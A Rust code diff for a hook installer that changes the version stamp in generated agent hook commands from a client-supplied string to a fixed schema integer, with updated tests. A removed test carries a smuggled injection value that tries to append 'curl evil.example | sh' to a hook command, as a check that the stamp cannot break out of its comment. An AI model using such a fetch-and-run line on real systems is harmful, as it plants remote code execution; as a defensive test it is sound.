@@ -54,8 +54,27 @@ pub const DAEMON_MARKER: &str = "set-status \"$TERMIOD_SESSION_ID\"";
 /// equally specific fingerprints.
 pub const CONFLICTING_HOOK_MARKERS: [&str; 2] = ["SUPERSET_HOME_DIR", "SUPERSET_AGENT_ID"];
 
-/// Marker + version stamped into every installed hook (`# termio-hooks v0.33.0`).
+/// Marker + schema version stamped into every installed hook
+/// (`# termio-hooks v1`).
 pub const HOOK_VERSION_MARKER: &str = "# termio-hooks v";
+
+/// The shape of what [`report_command`] generates — **not** the release this
+/// daemon was built from. Bump it by hand, and only when that function's output
+/// actually changes.
+///
+/// It used to be the release version, so every upgrade rewrote every hook even
+/// when the command was byte-identical. Agents that verify their hook files
+/// treat a content change as untrusted: Codex then shows "Modified since last
+/// trusted" and parks the session before it runs anything — on a file whose
+/// whole job is reporting status, so the sidebar keeps showing the last status
+/// it knew rather than `needs-you`. The more reliably we re-asserted, the more
+/// reliably a new session hit that wall.
+///
+/// Nothing reads this back; the write is idempotent against the file's own
+/// bytes (see [`write_if_unchanged`]), so a genuine change to the command
+/// re-installs on its own and the stamp is not what makes an upgrade heal.
+/// It stays so a config names the schema that wrote it in a bug report.
+pub const HOOK_SCHEMA_VERSION: u32 = 1;
 
 /// The Mac's skill, and a box's. They are different documents, not two spellings
 /// of one: the Mac's teaches the `termio sessions` CLI and gates on
@@ -125,11 +144,6 @@ pub struct InstallRequest {
     pub hooks: HalfAction,
     pub skills: HalfAction,
     pub reporter: Reporter,
-    /// The version stamped into each hook command as a trailing shell comment.
-    /// The command string changes between releases, so the stamp is what makes
-    /// the idempotent write re-install the hook on the first launch after an
-    /// upgrade.
-    pub hook_version: String,
     /// The absolute binary every generated hook invokes: this daemon's own,
     /// resolved once here rather than per command. Six dialects embed it, in two
     /// escaping contexts, and they must all name the same file.
@@ -146,7 +160,6 @@ impl InstallRequest {
         hooks: HalfAction,
         skills: HalfAction,
         reporter: Reporter,
-        hook_version: String,
         commands: HashMap<String, String>,
     ) -> InstallRequest {
         let binary = machine::daemon_binary();
@@ -155,7 +168,6 @@ impl InstallRequest {
             hooks,
             skills,
             reporter,
-            hook_version,
             binary,
             commands,
         }
@@ -627,10 +639,7 @@ pub fn report_command(
         HookDialect::CursorFlat => " --reply 2>/dev/null || printf '{}'",
         _ => " 2>/dev/null || true",
     });
-    command.push_str(&format!(
-        " {HOOK_VERSION_MARKER}{}",
-        version_stamp(&request.hook_version)
-    ));
+    command.push_str(&format!(" {HOOK_VERSION_MARKER}{HOOK_SCHEMA_VERSION}"));
     command
 }
 
@@ -649,19 +658,6 @@ pub(super) fn shell_quote_path(value: &str) -> String {
 /// `create`, a hook is *persistent* — it would keep running after the client that
 /// wrote it was gone. That is a different thing to leave lying around, and one
 /// `retain` closes it.
-fn version_stamp(version: &str) -> String {
-    let stamped: String = version
-        .chars()
-        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+'))
-        .take(64)
-        .collect();
-    if stamped.is_empty() {
-        "0".to_string()
-    } else {
-        stamped
-    }
-}
-
 /// Whether a command string is one termio installed.
 fn is_ours(command: &str) -> bool {
     command.contains(CLI_MARKER) || command.contains(SOCKET_MARKER) || command.contains(DAEMON_MARKER)
@@ -1418,7 +1414,6 @@ pub(super) mod tests {
             HalfAction::Install,
             HalfAction::Install,
             reporter,
-            "9.9.9".into(),
             HashMap::new(),
         );
         request.binary = binary.to_string();
@@ -1563,8 +1558,11 @@ pub(super) mod tests {
         );
         assert_eq!(
             mac,
-            "'/opt/termiod' set-status \"$TERMIOD_SESSION_ID\" done --transcript \
-             --tool-from tool_name 2>/dev/null || true # termio-hooks v9.9.9"
+            format!(
+                "'/opt/termiod' set-status \"$TERMIOD_SESSION_ID\" done --transcript \
+                 --tool-from tool_name 2>/dev/null || true \
+                 {HOOK_VERSION_MARKER}{HOOK_SCHEMA_VERSION}"
+            )
         );
         // And a device's is the same string. One form is the point: the two that
         // existed before drifted apart, and the fingerprint divergence that let a
@@ -1631,7 +1629,9 @@ pub(super) mod tests {
                 &request,
             );
             assert!(
-                command.ends_with("--reply 2>/dev/null || printf '{}' # termio-hooks v9.9.9"),
+                command.ends_with(&format!(
+                    "--reply 2>/dev/null || printf '{{}}' {HOOK_VERSION_MARKER}{HOOK_SCHEMA_VERSION}"
+                )),
                 "{command}"
             );
         }
@@ -1660,20 +1660,46 @@ pub(super) mod tests {
             .contains("my-own-notifier"));
     }
 
-    /// The stamp is client-supplied and sits in a trailing shell comment, so a
-    /// newline in it would put a command of the caller's choosing into a file
-    /// the agent runs on every turn — and would keep running it long after that
-    /// caller was gone.
+    /// The stamp closes a trailing shell comment, so anything able to put a
+    /// newline in it would append a command of its own choosing to a file the
+    /// agent runs every turn. It used to be a client-supplied string and was
+    /// sanitised for exactly that; it is now a compile-time integer, and this
+    /// pins the property the type is there to guarantee.
     #[test]
-    fn a_version_stamp_cannot_end_its_own_comment() {
-        let mut request = device_request("/x/termiod");
-        request.hook_version = "1.0\ncurl evil.example | sh".into();
-        let command = report_command("done", &StdinMining::of(&claude_spec()), HookDialect::ClaudeNested, &request);
+    fn the_stamp_cannot_end_its_own_comment() {
+        let request = device_request("/x/termiod");
+        let command = report_command(
+            "done",
+            &StdinMining::of(&claude_spec()),
+            HookDialect::ClaudeNested,
+            &request,
+        );
         assert!(!command.contains('\n'));
-        assert!(command.ends_with("# termio-hooks v1.0curlevil.examplesh"), "{command}");
-        request.hook_version = String::new();
-        let command = report_command("done", &StdinMining::of(&claude_spec()), HookDialect::ClaudeNested, &request);
-        assert!(command.ends_with("# termio-hooks v0"));
+        assert!(
+            command.ends_with(&format!("{HOOK_VERSION_MARKER}{HOOK_SCHEMA_VERSION}")),
+            "{command}"
+        );
+    }
+
+    /// Two runs of the same build generate the same bytes. This is the whole
+    /// point of the schema stamp: an upgrade that does not change the command
+    /// must not rewrite the file, because an agent that verifies its hooks
+    /// treats a rewrite as untrusted and stops.
+    #[test]
+    fn the_same_build_generates_the_same_command() {
+        let first = report_command(
+            "done",
+            &StdinMining::of(&claude_spec()),
+            HookDialect::ClaudeNested,
+            &device_request("/x/termiod"),
+        );
+        let second = report_command(
+            "done",
+            &StdinMining::of(&claude_spec()),
+            HookDialect::ClaudeNested,
+            &device_request("/x/termiod"),
+        );
+        assert_eq!(first, second);
     }
 
     /// An event left with no groups is dropped rather than kept as an empty
@@ -1765,10 +1791,10 @@ pub(super) mod tests {
             .expect("installs");
         let once = std::fs::read_to_string(&path).expect("read");
 
-        // A different version, so the block's bytes change and the write is not
-        // skipped as a no-op — the case where an append would actually happen.
-        let mut newer = device_request("/home/u/.local/bin/termiod");
-        newer.hook_version = "99.0".into();
+        // A different daemon path, so the block's bytes change and the write is
+        // not skipped as a no-op — the case where an append would actually
+        // happen.
+        let newer = device_request("/home/u/.local/bin/termiod.next");
         TomlHookBlock::new(&path, &spec, &newer)
             .install()
             .expect("installs again");
@@ -1779,7 +1805,7 @@ pub(super) mod tests {
         assert_eq!(twice.matches("[[hooks]]").count(), 3, "one user table, two ours");
         assert!(twice.starts_with(user_content.trim_end_matches('\n')));
         assert!(twice.contains("command = \"mine\""), "the user's own hook survives");
-        assert_ne!(once, twice, "the newer stamp did land");
+        assert_ne!(once, twice, "the newer command did land");
 
         TomlHookBlock::bare(&path).uninstall();
         assert_eq!(
